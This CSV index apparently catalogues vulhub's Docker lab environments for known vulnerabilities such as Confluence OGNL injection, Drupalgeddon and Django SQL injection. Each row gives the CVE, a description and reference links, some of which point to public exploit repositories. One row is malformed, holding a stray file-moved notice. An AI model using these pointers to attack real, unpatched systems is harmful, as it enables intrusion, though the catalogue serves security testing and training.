Name,CVE,Description,References,Path,Type,Startup,Vector
confluence,CVE-2023-22515,Atlassian Confluence Access Control Broken by Attributes Overwrite (CVE-2023-22515),"https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html
https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22515,docker-compose,docker compose up,remote
confluence,CVE-2022-26134,Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2022-26134),"https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134,docker-compose,docker compose up,remote
confluence,CVE-2023-22527,Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2023-22527),"https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html
https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22527,docker-compose,docker compose up,remote
confluence,CVE-2021-26084,Atlassian Confluence Webwork Pre-Auth OGNL Injection Leads to RCE (CVE-2021-26084),"https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html
https://jira.atlassian.com/browse/CONFSERVER-67940
https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
https://github.com/h3v0x/CVE-2021-26084_Confluence
http://192.168.1.162:8090/template/custom/content-editor.vm",https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2021-26084,docker-compose,docker compose up,remote
couchdb,CVE-2017-12636,Couchdb Arbitrary Command Execution (CVE-2017-12636),"https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
https://www.exploit-db.com/exploits/44498
http://bobao.360.cn/learning/detail/4716.html
http://vulhub:vulhub@your-ip:5984/_membership
http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd
http://vulhub:vulhub@your-ip:5984/vultest/_design/vul",https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12636,docker-compose,docker compose up,remote
couchdb,CVE-2017-12635,Apache Couchdb Remote Privilege Escalation (CVE-2017-12635),"https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
https://www.exploit-db.com/exploits/44498
http://bobao.360.cn/learning/detail/4716.html",https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635,docker-compose,docker compose up,remote
couchdb,CVE-2022-24706,CouchDB Erlang distribution Remote Command Execution (CVE-2022-24706),"https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html
https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb
https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit",https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2022-24706,docker-compose,docker compose up,remote
craftcms,CVE-2023-41892,CraftCMS ConditionsController Pre-Auth Remote Code Execution (CVE-2023-41892),"https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
https://blog.calif.io/p/craftcms-rce
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/",https://github.com/vulhub/vulhub/tree/master/craftcms/CVE-2023-41892,docker-compose,docker compose up,remote
craftcms,CVE-2024-56145,CraftCMS registerargcargv Leads to Remote Code Execution (CVE-2024-56145),"https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9
https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms",https://github.com/vulhub/vulhub/tree/master/craftcms/CVE-2024-56145,docker-compose,docker compose up,remote
cups-browsed,CVE-2024-47177,OpenPrinting Cups-Browsed Remote Code Execution via The FoomaticRIPCommandLine PPD parameter (CVE-2024-47177),"https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/
https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8",https://github.com/vulhub/vulhub/tree/master/cups-browsed/CVE-2024-47177,docker-compose,docker compose up,remote
discuz,Unknown,Discuz!X ≤3.4 Arbitrary File Deletion,https://lorexxar.cn/2017/09/30/dz-delete/,unknown,docker-compose,docker compose up,remote
discuz,Unknown,Discuz 7.x/6.x Remote Code Execution via Global Variable Override,https://www.secpulse.com/archives/2338.html,unknown,docker-compose,docker compose up,remote
django,CVE-2021-35042,Django QuerySet.order_by() SQL Injection (CVE-2021-35042),https://www.djangoproject.com/weblog/2021/jul/01/security-releases/,https://github.com/vulhub/vulhub/tree/master/django/CVE-2021-35042,docker-compose,docker compose up,remote
django,CVE-2019-14234,Django JSONField/HStoreField SQL Injection (CVE-2019-14234),"https://www.djangoproject.com/weblog/2019/aug/01/security-releases/
https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html",https://github.com/vulhub/vulhub/tree/master/django/CVE-2019-14234,docker-compose,docker compose up,remote
django,CVE-2022-34265,Django Trunc(kind) and Extract(lookup_name) SQL Injection (CVE-2022-34265),"https://www.djangoproject.com/weblog/2022/jul/04/security-releases/
https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492",https://github.com/vulhub/vulhub/tree/master/django/CVE-2022-34265,docker-compose,docker compose up,remote
django,CVE-2017-12794,Django 500 Debug Page Cross-Site Scripting (XSS) (CVE-2017-12794),"https://www.djangoproject.com/weblog/2017/sep/05/security-releases/
https://nvd.nist.gov/vuln/detail/CVE-2017-12794
https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html
https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html",https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794,docker-compose,docker compose up,remote
django,CVE-2020-9402,Django GIS functions and aggregates on Oracle SQL Injection (CVE-2020-9402),https://www.djangoproject.com/weblog/2020/mar/04/security-releases/,https://github.com/vulhub/vulhub/tree/master/django/CVE-2020-9402,docker-compose,docker compose up,remote
django,CVE-2018-14574,Django < 2.0.8 Open Redirect in CommonMiddleware (CVE-2018-14574),"https://www.djangoproject.com/weblog/2018/aug/01/security-releases/
https://nvd.nist.gov/vuln/detail/CVE-2018-14574",https://github.com/vulhub/vulhub/tree/master/django/CVE-2018-14574,docker-compose,docker compose up,remote
dns,Unknown,DNS Zone Transfers (AXFR),"https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
https://nmap.org/nsedoc/scripts/dns-zone-transfer.html",unknown,docker-compose,docker compose up,remote
docker,Unknown,Docker Remote API Unauthorized Access Leads to Remote Code Execution,"https://docs.docker.com/engine/security/protect-access/
https://tttang.com/archive/357/",unknown,docker-compose,docker compose up,remote
drupal,CVE-2018-7600,Drupal Drupalgeddon 2 Unauthenticated Remote Code Execution (CVE-2018-7600),"https://www.drupal.org/sa-core-2018-002
https://research.checkpoint.com/uncovering-drupalgeddon-2/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600,docker-compose,docker compose up,remote
drupal,CVE-2019-6341,Drupal Cross-Site Scripting by File Upload (CVE-2019-6341),"https://www.drupal.org/sa-core-2019-004
https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed
https://paper.seebug.org/897/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6341,docker-compose,docker compose up,remote
drupal,CVE-2019-6339,Drupal Remote Code Execution by phar deserialization (CVE-2019-6339),"https://www.drupal.org/sa-core-2019-002
https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed
https://paper.seebug.org/897/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2019-6339,docker-compose,docker compose up,remote
drupal,CVE-2017-6920,Drupal Core 8 PECL YAML Deserialization Remote Code Execution (CVE-2017-6920),"https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple
https://paper.seebug.org/334/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2017-6920,docker-compose,docker compose up,remote
drupal,CVE-2014-3704,"Drupal < 7.32 ""Drupalgeddon"" SQL Injection (CVE-2014-3704)","https://www.drupal.org/SA-CORE-2014-005
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2014-3704,docker-compose,docker compose up,remote
drupal,CVE-2018-7602,Drupal Drupalgeddon 3 Authenticated Remote Code Execution (CVE-2018-7602),"https://www.drupal.org/sa-core-2018-004
https://github.com/pimps/CVE-2018-7600
https://github.com/kastellanos/CVE-2018-7602
http://127.0.0.1:8080/",https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7602,docker-compose,docker compose up,remote
dubbo,CVE-2019-17564,Aapche Dubbo Unsafe Java Deserialization (CVE-2019-17564),"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html
https://www.anquanke.com/post/id/198747
https://paper.seebug.org/1128/
http://your-ip:8080/org.vulhub.api.CalcService",https://github.com/vulhub/vulhub/tree/master/dubbo/CVE-2019-17564,docker-compose,docker compose up,remote
ecshop,Unknown,ECShop 2.x/3.x SQL Injection / Remote Code Execution Vulnerability,https://paper.seebug.org/691/,unknown,docker-compose,docker compose up,remote
ecshop,Unknown,ECShop 4.x collection_list SQL Injection,"https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw
http://foreversong.cn/archives/1556",unknown,docker-compose,docker compose up,remote
elasticsearch,CVE-2014-3120,ElasticSearch Remote Code Execution (CVE-2014-3120),"https://bou.ke/blog/elasticsearch-rce/
https://www.exploit-db.com/exploits/33370",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120,docker-compose,docker compose up,remote
elasticsearch,CVE-2015-3337,ElasticSearch Plug-in Directory Traversal (CVE-2015-3337),"https://nvd.nist.gov/vuln/detail/CVE-2015-3337
https://github.com/elastic/elasticsearch/issues/10828
https://github.com/mobz/elasticsearch-head",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-3337,docker-compose,docker compose up,remote
elasticsearch,CVE-2015-5531,ElasticSearch Snapshot and Restore Directory Traversal (CVE-2015-5531),"https://www.exploit-db.com/exploits/38383/
http://www.freebuf.com/vuls/99942.html",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531,docker-compose,docker compose up,remote
elasticsearch,CVE-2015-1427,ElasticSearch Groovy Sandbox Bypass and Remote Code Execution (CVE-2015-1427),"http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
https://github.com/XiphosResearch/exploits
http://cb.drops.wiki/drops/papers-5107.html
http://cb.drops.wiki/drops/papers-5142.html",https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427,docker-compose,docker compose up,remote
elasticsearch,Unknown,ElasticSearch Arbitrary File Upload (WooYun-2015-110216),"http://cb.drops.wiki/bugs/wooyun-2015-0110216.html
http://127.0.0.1:9200/yz.jsp/yz.jsp/1",unknown,docker-compose,docker compose up,remote
electron,CVE-2018-15685,Electron WebPreferences Remote Code Execution Vulnerability（CVE-2018-15685）,"https://electronjs.org/blog/web-preferences-fix
https://www.contrastsecurity.com/security-influencers/cve-2018-15685",https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-15685,docker-compose,docker compose up,remote
electron,CVE-2018-1000006,Electron Remote Code Execution Vulnerability（CVE-2018-1000006）,,https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-1000006,docker-compose,docker compose up,remote
elfinder,CVE-2021-32682,elFinder ZIP Arguments Injection Leads to Commands Injection (CVE-2021-32682),"https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities
https://packetstormsecurity.com/files/164173/elfinder_archive_cmd_injection.rb.txt
https://xz.aliyun.com/t/10739
http://localhost.lan:8080/",https://github.com/vulhub/vulhub/tree/master/elfinder/CVE-2021-32682,docker-compose,docker compose up,remote
erlang,CVE-2025-32433,Unauthenticated Remote Code Execution in Erlang/OTP SSH (CVE-2025-32433),"https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2
https://github.com/erlang/otp/commit/6eef04130afc8b0ccb63c9a0d8650209cf54892f#diff-ceeb1aeeb602e1424c13d9da9383e0782f65869d6e64e015c194145b1a64edcd
https://github.com/ProDefense/CVE-2025-32433
https://datatracker.ietf.org/doc/html/rfc4254",https://github.com/vulhub/vulhub/tree/master/erlang/CVE-2025-32433,docker-compose,docker compose up,remote
fastjson,Unknown,Fastjson 1.2.47 Deserialization Remote Command Execution,"https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
https://www.freebuf.com/vuls/208339.html",unknown,docker-compose,docker compose up,remote
fastjson,Unknown,"Alert

This file is move to Here
-------------------------------------------------------------------------------",,unknown,docker-compose,docker compose up,remote
fastjson,Unknown,Fastjson 1.2.24 Deserialization Remote Command Execution (CVE-2017-18349),"https://www.freebuf.com/vuls/208339.html
http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/
http://your-ip:8090/",unknown,docker-compose,docker compose up,remote
ffmpeg,CVE-2017-9993,FFmpeg AVI Arbitrary File Read (CVE-2017-9993),"https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/
https://github.com/neex/ffmpeg-avi-m3u-xbin
https://www.anquanke.com/post/id/86337
https://github.com/neex/ffmpeg-avi-m3u-xbin",https://github.com/vulhub/vulhub/tree/master/ffmpeg/CVE-2017-9993,docker-compose,docker compose up,remote
ffmpeg,CVE-2016-1897,FFmpeg Arbitrary File Read and SSRF (CVE-2016-1897/CVE-2016-1898),"https://tttang.com/archive/465/
http://habrahabr.ru/company/mailru/blog/274855/
http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/",https://github.com/vulhub/vulhub/tree/master/ffmpeg/CVE-2016-1897,docker-compose,docker compose up,remote
flask,Unknown,Flask (Jinja2) Server-Side Template Injection,"https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates",unknown,docker-compose,docker compose up,remote
flink,CVE-2020-17518,Apache Flink Upload Path Traversal (CVE-2020-17518),"https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4
https://nvd.nist.gov/vuln/detail/CVE-2020-17518",https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518,docker-compose,docker compose up,remote
flink,CVE-2020-17519,Apache Flink jobmanager/logs Path Traversal (CVE-2020-17519),"https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801
https://nvd.nist.gov/vuln/detail/CVE-2020-17519",https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519,docker-compose,docker compose up,remote
geoserver,CVE-2024-36401,GeoServer Unauthenticated Remote Code Execution in Evaluating Property Name Expressions (CVE-2024-36401),"https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv
https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w
https://tttang.com/archive/1771/
https://github.com/Warxim/CVE-2022-41852",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401,docker-compose,docker compose up,remote
geoserver,CVE-2022-24816,GeoServer Remote Code Injection caused by JAI-EXT (CVE-2022-24816/CVE-2023-35042),"https://www.synacktiv.com/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver
https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx
https://geoserver.org/vulnerability/2022/04/11/geoserver-2-jiffle-jndi-rce.html
https://osgeo-org.atlassian.net/browse/GEOS-10458
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24816.yaml
http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd"">",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2022-24816,docker-compose,docker compose up,remote
geoserver,CVE-2021-40822,GeoServer Unauthenticated Server-Side Request Forgery (CVE-2021-40822),"https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
https://nvd.nist.gov/vuln/detail/CVE-2021-40822",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2021-40822,docker-compose,docker compose up,remote
geoserver,CVE-2023-25157,GeoServer OGC Filter SQL Injection (CVE-2023-25157),"https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158
https://github.com/advisories/GHSA-7g5f-wrx8-5ccf",https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2023-25157,docker-compose,docker compose up,remote
ghostscript,CVE-2018-16509,GhostScript Sandbox Bypass Command Execution (CVE-2018-16509),"http://seclists.org/oss-sec/2018/q3/142
https://bugs.chromium.org/p/project-zero/issues/detail?id=1640",https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2018-16509,docker-compose,docker compose up,remote
ghostscript,CVE-2018-19475,GhostScript Sandbox Bypass Command Execution (CVE-2018-19475),"https://blog.semmle.com/ghostscript-CVE-2018-19475/
https://bugs.ghostscript.com/show_bug.cgi?id=700153",https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2018-19475,docker-compose,docker compose up,remote
